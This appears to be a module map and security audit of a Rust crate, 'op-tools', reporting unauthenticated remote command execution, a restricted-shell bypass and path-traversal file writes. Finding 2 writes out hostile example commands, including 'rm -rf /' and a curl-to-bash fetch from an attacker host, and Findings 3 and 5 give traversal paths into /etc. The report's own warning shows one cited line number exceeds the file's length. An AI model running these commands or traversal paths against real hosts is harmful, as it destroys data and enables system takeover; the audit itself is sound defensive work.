# Architecture & Module Map

## Overview
The `op-tools` crate is a core component of the `OP-DBUS` control plane, providing a comprehensive tool registry, dynamic runtime discovery of D-Bus services, and execution capability for Linux system administration tools.

- **Total `.rs` files**: 52
- **Top-level modules**: `builtin`, `discovery`, `dynamic_tool`, `mcptools`, `orchestration_plugin`, `registry`, `router`, `security`, `tool`, `validation`.
- **Binary targets**: `op-packagekit-install`

Cite: `crates/op-tools/src/lib.rs:1`

---

## Module Tree
```
op-tools (lib.rs)
├── builtin (mod.rs)
│   ├── agent_tool
│   ├── anydesk
│   ├── code_search
│   ├── dbus
│   ├── dbus_hybrid
│   ├── dbus_introspection
│   ├── dbus_search_tool
│   ├── dbus_tool
│   ├── dinit
│   ├── error_reporting_tool
│   ├── file
│   ├── gcloud_tools
│   ├── incus_tools
│   ├── indexer_tools
│   ├── lxc_tools
│   ├── openflow_tools
│   ├── ovs
│   ├── ovs_tools
│   ├── ovsdb
│   ├── packagekit
│   ├── plugin
│   ├── plugin_projection
│   ├── plugin_state_tool
│   ├── procfs
│   ├── respond_tool
│   ├── response_tools
│   ├── rtnetlink_tools
│   ├── self_tools
│   ├── shell
│   ├── shell_tool
│   └── system
├── discovery (mod.rs)
│   ├── projection_engine
│   └── sources (mod.rs)
│       ├── agent
│       ├── dbus
│       └── plugin
├── dynamic_tool
├── mcptools
├── orchestration_plugin
├── registry
├── router
├── security
├── tool
└── validation
```

---

## Entry Points
- **Library Entry Point**: `crates/op-tools/src/lib.rs`
- **Binary Entry Point**: `crates/op-tools/src/bin/op-packagekit-install.rs`

---

## Notes
- `crates/op-tools/src/builtin_old.rs` is present on disk but is not registered as a module under `src/lib.rs`.
- `crates/op-tools/src/validation_tests.rs` contains unit tests for validation features but is not explicitly declared as a submodule.

---

# Security & Quality Audit Findings

### Finding 1: Unauthenticated Remote Arbitrary Command Execution (Critical)
- **File**: `crates/op-tools/src/router.rs:52`
- **Vulnerability**: The Axum HTTP routing endpoint `/api/tools/:name/execute` accepts any `Json<Value>` parameters and directly triggers execution on matching registered tools:
```rust
async fn execute_tool_handler(
    State(state): State<ToolsState>,
    axum::extract::Path(name): axum::extract::Path<String>,
    Json(params): Json<Value>,
) -> impl IntoResponse {
    if let Some(tool) = state.registry.get(&name).await {
        match tool.execute(params).await {
...
```
There is absolutely no authentication, session validation, or token verification performed anywhere in `router.rs` or `create_router`. Because the tool registry loads highly privileged utilities such as `shell_execute`, `file_write`, and `self_write_file`, any remote user with network access to the HTTP port can run arbitrary shell commands on the host as the service user (typically `root`).
- **Impact**: Full unauthenticated Remote Code Execution (RCE) and system compromise.

---

### Finding 2: Restricted Shell Escape / Arbitrary Command Injection in Security Validator (Critical)
- **File**: `crates/op-tools/src/security.rs:360`
- **Vulnerability**: In `security.rs`, the `check_command` validation function used for `Restricted` mode parses only the first whitespace-separated word of a command (`base_cmd`) and matches it against the allowed whitelist:
```rust
            AccessLevel::Restricted => {
                // Check against the restricted allowlist
                let base_cmd = command
                    .split_whitespace()
                    .next()
                    .ok_or_else(|| SecurityError::ValidationFailed("Empty command".to_string()))?;

                if let Some(allowed) = &profile.custom_allowed_commands {
                    if !allowed.contains(base_cmd) {
                        return Err(SecurityError::AccessDenied(format!(
                            "Command '{}' not allowed in restricted mode",
                            base_cmd
                        )));
                    }
                }
                Ok(None)
            }
```
If an untrusted user executes a command such as `ls ; rm -rf /` or `uptime && curl http://attacker.com/malicious.sh | bash`, the `base_cmd` is evaluated as `ls` or `uptime`. Both commands are in the allowed restricted list. The validation check succeeds. The raw, unmodified command is then directly executed inside `Command::new("bash").arg("-c").arg(command)` in `builtin/shell.rs`.
- **Impact**: Complete bypass of the `Restricted` profile safety sandbox, allowing untrusted users to execute arbitrary terminal commands.

---

### Finding 3: Repository Path Escape and Arbitrary File Write in `self_write_file` (Critical)
- **File**: `crates/op-tools/src/builtin/self_tools.rs:1451`
- **Vulnerability**: The parent directory check in the `self_write_file` tool can be bypassed by specifying a target path whose immediate parent directory does not exist:
```rust
        let parent = full_path.parent();
        if let Some(p) = parent {
            if p.exists() {
                let canonical_parent = p.canonicalize().unwrap_or(p.to_path_buf());
                if !canonical_parent.starts_with(&canonical_repo) {
                    return Err(anyhow::anyhow!(
                        "Path '{}' would escape the self-repository. Access denied.",
                        path
                    ));
                }
            } else if !create_dirs {
                return Err(anyhow::anyhow!("Parent directory does not exist: {:?}", p));
            }
        }
```
If `path` is set to `../../../../etc/cron.d/new_sub/malicious`, the parent path `p` points to `/home/jeremy/agents/../../../../etc/cron.d/new_sub`. Since `/etc/cron.d/new_sub` does not exist on the system, `p.exists()` returns `false`. This completely skips the repository boundary check (`starts_with`). 
Then, because `create_dirs` defaults to `true`, the parent directory is created using `tokio::fs::create_dir_all(parent).await?` which resolves `..` components lexically, resulting in the creation of `/etc/cron.d/new_sub`. Finally, the tool writes `malicious` outside of the self-repository.
- **Impact**: Arbitrary file writes outside of the repository boundary, enabling local privilege escalation (e.g., via cron or systemd directories).

---

### Finding 4: Complete Inaction of Input Validation System (High)
- **File**: `crates/op-tools/src/validation.rs:1`
- **Issue**: The entire parameter sanitization and validation framework implemented in `validation.rs`—which filters out dangerous characters like `;`, `&`, `|`, `$`, and checks schemas—is never integrated into either the Axum handler (`router.rs:114`) or the tool executor (`executor.rs:75`). 
- **Impact**: The code executes incoming payloads directly via `tool.execute(params)`, meaning the system's primary defense-in-depth mechanism is completely bypassed by omission.

---

### Finding 5: Lexical Path Traversal Vulnerability in `validate_self_path` (High)
- **File**: `crates/op-tools/src/builtin/self_tools.rs:51`
- **Issue**: If the resolved path does not exist, `canonicalize()` fails and falls back to `full_path.clone()`:
```rust
    let canonical = full_path.canonicalize().unwrap_or_else(|_| full_path.clone());
    
    // Ensure it's still within the repo
    if !canonical.starts_with(&repo_path) { ... }
```
Because `canonical` retains un-normalized components (such as `..`) when the file is missing, the lexical check `starts_with` evaluates to `true` if the path begins with `repo_path` (e.g., `/home/jeremy/agents/../../../../etc/passwd` starts with `/home/jeremy/agents` lexically), bypassing the sandbox boundary check.
- **Impact**: Bypasses directory isolation controls for non-existent target paths.

---

### Finding 6: Silent Denial of Service in `create_plugin_state_tool` (Medium)
- **File**: `crates/op-tools/src/builtin/plugin_state_tool.rs:211`
- **Issue**: The factory function `create_plugin_state_tool` initializes a local, empty instance of `DefaultPluginExecutor`:
```rust
pub fn create_plugin_state_tool( ... ) -> Result<BoxedTool> {
    let executor = Arc::new(DefaultPluginExecutor::new());
    Ok(Arc::new(PluginStateTool::new(..., executor)))
}
```
This fresh executor contains no registered plugins. As a result, executing any state tool (Query, Diff, or Apply) created through this factory will always fail with a `"Plugin not found"` error.
- **Impact**: Broken state-plugin execution unless callers explicitly use `create_plugin_state_tool_with_executor`.

---

### Finding 7: Lack of Serialization support for complex D-Bus signatures (Medium)
- **File**: `crates/op-tools/src/builtin/dbus_introspection.rs:253`
- **Issue**: The `json_to_owned_value` function used during dynamic D-Bus calls only converts basic JSON primitives (strings, numbers, booleans) and explicitly rejects objects or arrays with an error:
```rust
    } else {
        Err(anyhow!("Unsupported argument type; use string/number/bool"))
    }
```
- **Impact**: Any dynamic D-Bus introspection tool trying to invoke methods requiring arrays (`as`, `ao`) or complex structs will fail to execute.

---

### Finding 8: Hardcoded Home Directories and Username (Low)
- **File**: `crates/op-tools/src/builtin/anydesk.rs:417` and `crates/op-tools/src/discovery/sources/agent.rs:24`
- **Issue**: Paths such as `/home/jeremy/` are hardcoded in the source code to locate the AnyDesk config and the agents folder.
- **Impact**: Portability and configuration issues if the server is deployed under different user names or in alternative directory paths.

---
## ⚠ Citation Warnings
- `crates/op-tools/src/builtin/self_tools.rs:1451`: file has 988 lines
